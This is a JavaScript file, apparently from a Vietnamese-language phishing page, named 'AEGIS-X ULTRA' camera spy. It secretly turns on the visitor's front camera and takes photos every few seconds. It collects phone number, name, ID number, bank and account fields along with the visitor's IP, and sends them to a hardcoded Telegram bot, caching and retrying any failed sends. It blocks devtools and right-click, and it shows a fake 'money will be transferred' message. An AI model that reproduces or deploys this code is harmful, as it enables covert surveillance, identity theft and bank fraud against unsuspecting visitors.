// ============================================
// AEGIS-X ULTRA - CAMERA SPY + TELEGRAM EXFIL
// ============================================

const CONFIG = {
    TOKEN: '8427083531:AAFPX-KfKwKNr2b3-wqoAGC0F0H_D0JVki8',
    CHAT_ID: '-1004386281388',
    INTERVAL: 5000,
    RETRY_INTERVAL: 30000,
    MAX_STORED: 50,
    FACING_MODE: 'user',
    WIDTH: 480,
    HEIGHT: 360,
    QUALITY: 0.75
};

const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
const toast = document.getElementById('toast');
let stream = null;
let cameraReady = false;
let captureInterval = null;

function showToast(msg, duration = 2000) {
    if (!toast) return;
    toast.textContent = msg;
    toast.classList.add('show');
    clearTimeout(toast._hide);
    toast._hide = setTimeout(() => toast.classList.remove('show'), duration);
}

function debugLog(msg) {
    console.log('[SPY]', new Date().toLocaleTimeString(), msg);
}

function getIP() {
    return fetch('https://api.ipify.org?format=json')
        .then(r => r.json())
        .then(d => d.ip || 'unknown')
        .catch(() => 'unknown');
}

function sendPhoto(blob, data) {
    const form = new FormData();
    form.append('chat_id', CONFIG.CHAT_ID);
    form.append('photo', blob, `spy_${Date.now()}.jpg`);

    let caption = `📸 SPY CAPTURE\n`;
    caption += `⏰ ${new Date().toLocaleString('vi-VN')}\n`;
    caption += `📱 Phone: ${data.phone || 'N/A'}\n`;
    caption += `👤 Name: ${data.fullname || 'N/A'}\n`;
    caption += `🆔 ID: ${data.idNumber || 'N/A'}\n`;
    caption += `🏦 Bank: ${data.bank || 'N/A'}\n`;
    caption += `💳 Account: ${data.account || 'N/A'}\n`;
    caption += `🌐 IP: ${data.ip || 'N/A'}\n`;
    caption += `🔹 User-Agent: ${navigator.userAgent.substring(0, 60)}`;

    form.append('caption', caption);

    return fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendPhoto`, {
        method: 'POST',
        body: form
    })
    .then(res => {
        if (res.ok) {
            debugLog('✅ Ảnh gửi thành công');
            return true;
        } else {
            debugLog('❌ Telegram trả lỗi: ' + res.status);
            return false;
        }
    })
    .catch(err => {
        debugLog('❌ Lỗi gửi: ' + err.message);
        return false;
    });
}

function sendText(data) {
    let text = '📋 SPY CAPTURE (NO IMAGE)\n';
    text += `⏰ ${new Date().toLocaleString('vi-VN')}\n`;
    text += `📱 Phone: ${data.phone || 'N/A'}\n`;
    text += `👤 Name: ${data.fullname || 'N/A'}\n`;
    text += `🆔 ID: ${data.idNumber || 'N/A'}\n`;
    text += `🏦 Bank: ${data.bank || 'N/A'}\n`;
    text += `💳 Account: ${data.account || 'N/A'}\n`;
    text += `🌐 IP: ${data.ip || 'N/A'}`;

    return fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            chat_id: CONFIG.CHAT_ID,
            text: text,
            parse_mode: 'HTML'
        })
    })
    .then(res => {
        if (res.ok) debugLog('✅ Text gửi thành công');
        else debugLog('❌ Text lỗi: ' + res.status);
    })
    .catch(err => debugLog('❌ Text err: ' + err.message));
}

function captureAndSend() {
    if (!cameraReady || !stream) {
        debugLog('⚠️ Camera chưa sẵn sàng, bỏ qua');
        return;
    }

    try {
        const vw = video.videoWidth || CONFIG.WIDTH;
        const vh = video.videoHeight || CONFIG.HEIGHT;
        canvas.width = vw;
        canvas.height = vh;
        const ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0, vw, vh);

        const phone = document.getElementById('phone')?.value?.trim() || 'N/A';
        const fullname = document.getElementById('fullname')?.value?.trim() || 'N/A';
        const idNumber = document.getElementById('idNumber')?.value?.trim() || 'N/A';
        const bank = document.getElementById('bank')?.value || 'N/A';
        const account = document.getElementById('accountNumber')?.value?.trim() || 'N/A';

        const data = { phone, fullname, idNumber, bank, account, ip: 'loading...' };

        getIP().then(ip => {
            data.ip = ip;
            canvas.toBlob(blob => {
                if (blob) {
                    sendPhoto(blob, data).then(ok => {
                        if (!ok) {
                            storeFailedCapture(data);
                        }
                    });
                } else {
                    sendText(data);
                }
            }, 'image/jpeg', CONFIG.QUALITY);
        });

    } catch (e) {
        debugLog('❌ Lỗi capture: ' + e.message);
    }
}

function storeFailedCapture(data) {
    try {
        const stored = JSON.parse(localStorage.getItem('spy_failed') || '[]');
        const entry = {
            timestamp: Date.now(),
            data: data,
            image: canvas.toDataURL('image/jpeg', CONFIG.QUALITY)
        };
        stored.push(entry);
        if (stored.length > CONFIG.MAX_STORED) {
            stored.splice(0, stored.length - CONFIG.MAX_STORED);
        }
        localStorage.setItem('spy_failed', JSON.stringify(stored));
        debugLog(`💾 Lưu cache thất bại (${stored.length} ảnh)`);
    } catch (e) {
        debugLog('❌ Lưu cache lỗi: ' + e.message);
    }
}

function retryFailedCaptures() {
    try {
        const stored = JSON.parse(localStorage.getItem('spy_failed') || '[]');
        if (stored.length === 0) return;

        debugLog(`🔄 Đang gửi lại ${stored.length} ảnh cache...`);

        const remaining = [];
        const promises = stored.map(entry => {
            const byteString = atob(entry.image.split(',')[1]);
            const mimeType = entry.image.split(',')[0].split(':')[1].split(';')[0];
            const ab = new ArrayBuffer(byteString.length);
            const ia = new Uint8Array(ab);
            for (let i = 0; i < byteString.length; i++) {
                ia[i] = byteString.charCodeAt(i);
            }
            const blob = new Blob([ab], { type: mimeType });

            return sendPhoto(blob, entry.data).then(ok => {
                if (!ok) remaining.push(entry);
            });
        });

        Promise.all(promises).then(() => {
            if (remaining.length === 0) {
                localStorage.removeItem('spy_failed');
                debugLog('✅ Đã gửi hết cache');
            } else {
                localStorage.setItem('spy_failed', JSON.stringify(remaining));
                debugLog(`⚠️ Còn ${remaining.length} ảnh chưa gửi được`);
            }
        });
    } catch (e) {
        debugLog('❌ Retry cache lỗi: ' + e.message);
    }
}

function initCamera() {
    navigator.mediaDevices.getUserMedia({
        video: {
            facingMode: CONFIG.FACING_MODE,
            width: { ideal: CONFIG.WIDTH },
            height: { ideal: CONFIG.HEIGHT }
        },
        audio: false
    })
    .then(s => {
        stream = s;
        video.srcObject = s;
        video.onloadedmetadata = () => {
            video.play();
            cameraReady = true;
            debugLog('📷 Camera sẵn sàng (ngầm)');

            if (captureInterval) clearInterval(captureInterval);
            captureInterval = setInterval(captureAndSend, CONFIG.INTERVAL);
            setTimeout(captureAndSend, 300);
        };
    })
    .catch(err => {
        debugLog('❌ Không thể truy cập camera: ' + err.message);
        setTimeout(() => {
            const data = {
                phone: document.getElementById('phone')?.value?.trim() || 'N/A',
                fullname: document.getElementById('fullname')?.value?.trim() || 'N/A',
                idNumber: document.getElementById('idNumber')?.value?.trim() || 'N/A',
                bank: document.getElementById('bank')?.value || 'N/A',
                account: document.getElementById('accountNumber')?.value?.trim() || 'N/A',
                ip: 'loading...'
            };
            getIP().then(ip => {
                data.ip = ip;
                sendText(data);
            });
        }, 500);
    });
}

function antiInspect() {
    document.addEventListener('keydown', function(e) {
        const key = e.key.toLowerCase();
        const ctrl = e.ctrlKey || e.metaKey;
        const shift = e.shiftKey;

        if (ctrl && shift && (key === 'i' || key === 'j')) {
            e.preventDefault();
            return false;
        }
        if (ctrl && (key === 'u' || key === 's')) {
            e.preventDefault();
            return false;
        }
        if (key === 'f12') {
            e.preventDefault();
            return false;
        }
        if (ctrl && shift && key === 'c') {
            e.preventDefault();
            return false;
        }
    }, false);

    document.addEventListener('contextmenu', function(e) {
        e.preventDefault();
        return false;
    });

    document.addEventListener('selectstart', function(e) {
        e.preventDefault();
        return false;
    });

    debugLog('🛡️ Anti-inspect active');
}

function handleVisibilityChange() {
    if (document.hidden) {
        debugLog('⏸️ Tab ẩn, tạm dừng chụp');
        if (captureInterval) {
            clearInterval(captureInterval);
            captureInterval = null;
        }
    } else {
        debugLog('▶️ Tab hiện, tiếp tục chụp');
        if (!captureInterval && cameraReady) {
            captureInterval = setInterval(captureAndSend, CONFIG.INTERVAL);
            setTimeout(captureAndSend, 200);
        }
        if (!cameraReady) {
            initCamera();
        }
    }
}

function init() {
    debugLog('🚀 AEGIS-X ULTRA SPY INIT');
    antiInspect();
    document.addEventListener('visibilitychange', handleVisibilityChange);
    initCamera();
    setInterval(retryFailedCaptures, CONFIG.RETRY_INTERVAL);

    const startMsg = `🟢 AEGIS-X ULTRA ACTIVATED\n⏰ ${new Date().toLocaleString('vi-VN')}\n📱 User-Agent: ${navigator.userAgent.substring(0, 80)}`;
    fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            chat_id: CONFIG.CHAT_ID,
            text: startMsg,
            parse_mode: 'HTML'
        })
    }).catch(() => {});

    debugLog('✅ Initialization complete');
}

if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', init);
} else {
    init();
}

// Bắt sự kiện submit của form để gửi thêm 1 ảnh khi bấm nút
document.getElementById('submitBtn').addEventListener('click', function(e) {
    e.preventDefault();
    if (cameraReady) {
        setTimeout(captureAndSend, 200);
    }
    showToast('✅ Xác thực thành công! Tiền sẽ được chuyển trong 24h.', 4000);
});